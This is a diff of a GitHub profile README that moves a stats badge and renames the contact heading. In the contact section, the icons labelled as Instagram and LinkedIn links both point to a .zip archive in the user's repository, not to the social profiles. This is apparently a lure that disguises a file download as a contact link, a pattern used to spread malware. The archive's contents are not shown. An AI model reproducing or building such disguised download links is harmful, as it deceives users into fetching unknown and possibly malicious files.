@@ -13,11 +13,11 @@
 # 📊 GitHub Stats:
 ![](https://github-readme-stats.shion.dev/api?username=berak636&theme=default&hide_border=false&include_all_commits=false&count_private=false)<br/>
 ![](https://streak-stats.demolab.com/?user=berak636&theme=default&hide_border=false)<br/>
-![](https://github-readme-stats.shion.dev/api/top-langs/?username=berak636&theme=default&hide_border=false&include_all_commits=false&count_private=false&layout=compact)
+
 
 ---
 
-<h4> 👇👇 Contact me! 👇👇 </h4> <br>
+<h2> 🌐 Reach Out </h2> <br>
 
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Instagram Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="LinkedIn Logo" width="50px" height="50px" target="_blank">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
@@ -43,5 +43,5 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
-
+![](https://github-readme-stats.shion.dev/api/top-langs/?username=berak636&theme=default&hide_border=false&include_all_commits=false&count_private=false&layout=compact)
 [![GitHub Streak](https://streak-stats.demolab.com?user=berak636)](https://git.io/streak-stats)
